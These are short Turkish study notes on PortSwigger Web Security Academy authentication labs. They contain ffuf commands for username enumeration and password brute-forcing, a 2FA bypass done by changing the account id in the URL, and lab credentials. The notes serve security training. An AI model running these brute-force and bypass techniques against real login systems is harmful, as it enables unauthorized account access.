# Lab1 

Burada brute-force ile username enumeration yapıyoruz.
Sistem kullanıcı adının sisteme kayıtlı olduğu bilgisini sızdırıyor.

[[Ffuf]] toolunu kullanarak :

```bash title:"payload"
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=1" -u https://0ad1004e03366db781536c8a0022003b.web-security-academy.net/login -fs 3142 
```

payload'ı ile username i bulabilirsin sonrasında yine aynı payload ile şifreyi brute-force edebilrsin.
# Lab2 (2FA)

- Your credentials: `wiener:peter`
- Victim's credentials `carlos:montoya`

diğer hesaba girerken `/login2` endpointinde `2fa` kontrol ediyor doğruysa  beni `/my-account?id=wiener` e yönlediriyor  login2 kısmına girdikten sonrasında direk `/my-account?id=carlos` girersem bypass ediyorum


# Lab3 (Pass Reset)

Pass reset yaparken kullanıcı idsini alıyor 


# Lab4 ()

```bash
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=11111" -u https://0a7f005f04b732ca81cec53900c50056.web-security-academy.net/login -fr "Invalid username or password\."
```
Bu payloadı kullanarak içerisinde `"Invalid username or password." `bulunan responseları filtrelersin. 
içerisinde `"Invalid username or password"` bulunan löpçük diye ortaya çıkar.